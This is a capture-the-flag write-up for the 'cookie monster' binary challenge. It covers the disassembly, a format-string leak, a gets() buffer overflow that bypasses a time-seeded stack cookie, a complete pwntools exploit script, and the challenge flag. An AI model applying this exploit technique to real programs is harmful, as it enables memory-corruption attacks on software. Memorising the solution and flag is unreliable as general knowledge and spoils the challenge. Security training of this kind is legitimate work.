# cookie monster

RELRO:    Full RELRO
NX:       NX enabled
PIE:      PIE enabled


the `main()` function calls `conversation()` that reads input twice then returns.

```
$ ./cookie_monster 
               _  _
             _/0\/ \_
    .-.   .-` \_/\0/ '-.
   /:::\ / ,_________,  \
  /\:::/ \  '. (:::/  `'-;
  \ `-'`\ '._ `"'"'\__    \
   `'-.  \   `)-=-=(  `,   |
       \  `-"`      `"-`   /
C is for cookie is for me
Oh hello there, what's your name?
name
Hello, name

Would you like a cookie?
yes
```

this is the dump of assembler code for fuction `conversation()`

```asm
<+0>:	push   rbp
<+1>:	mov    rbp,rsp
<+4>:	sub    rsp,0x20
<+8>:	mov    edi,0x0
<+13>:	call   0x1080 <time@plt>
<+18>:	mov    edi,eax
<+20>:	call   0x1050 <srand@plt>
<+25>:	call   0x10b0 <rand@plt>
<+30>:	mov    DWORD PTR [rbp-0x4],eax
<+33>:	mov    eax,DWORD PTR [rbp-0x4]
<+36>:	mov    DWORD PTR [rip+0x2dcd],eax        # 0x401c <saved_cookie>
<+42>:	lea    rdi,[rip+0xe02]        # 0x2058
<+49>:	call   0x1030 <puts@plt>
<+54>:	mov    rdx,QWORD PTR [rip+0x2dae]        # 0x4010 <stdin@@GLIBC_2.2.5>
<+61>:	lea    rax,[rbp-0xc]
<+65>:	mov    esi,0x8
<+70>:	mov    rdi,rax
<+73>:	call   0x1060 <fgets@plt>
<+78>:	lea    rdi,[rip+0xe01]        # 0x207b
<+85>:	mov    eax,0x0
<+90>:	call   0x1040 <printf@plt>
<+95>:	lea    rax,[rbp-0xc]
<+99>:	mov    rdi,rax
<+102>:	mov    eax,0x0
<+107>:	call   0x1040 <printf@plt>
<+112>:	lea    rdi,[rip+0xde7]        # 0x2083
<+119>:	call   0x1030 <puts@plt>
<+124>:	lea    rax,[rbp-0x11]
<+128>:	mov    rdi,rax
<+131>:	mov    eax,0x0
<+136>:	call   0x1090 <gets@plt>
<+141>:	mov    eax,DWORD PTR [rbp-0x4]
<+144>:	mov    edi,eax
<+146>:	call   0x11f6 <check_cookie>
<+151>:	nop
<+152>:	leave  
<+153>:	ret
```
the first input with `fgets()` <+73> reads 7 characters, we notice there is a format string vulnarbility<br>
at `printf()` <+90> but we can only leak one address at the time, the second input calls `gets()` <+136><br>
so we can overflow the buffer but there is a `check_cookie()` function at <+146> that exits if the stack cookie<br>
value at the bottom of the stack is changed<br>

to be able to jump to the flag function, we have to leak the stack cookie and the return address<br>

the value of the stack cookie changes every second, so we can leak the cookie in a first iteration<br>
then leak the return address in a second iteration before the cookie changes and overwrite the return address<br>

[exploit.py](./exploit.py)
```python
#!/usr/bin/env python2

from pwn import *
import sys

if len(sys.argv) == 1:
    conn = remote('ctf.umbccd.io', 4200)
else:
    conn = process('./cookie_monster')

conn.sendlineafter('?', '%9$lx')
conn.recvuntil('Hello, ')
canary = p32(int(conn.recv(8), 16))
conn.close()

conn = process('./cookie_monster')
conn.sendlineafter('?', '%11$lx')
conn.recvuntil('Hello, ')
ret = p64(int(conn.recv(12), 16) - 0x19a)
payload = 'a'*13 + canary + 'a'*8 + ret
conn.sendlineafter('?', payload)
print conn.recvall()
conn.close()
```

### flag
DawgCTF{oM_n0m_NOm_I_li3k_c0oOoki3s}
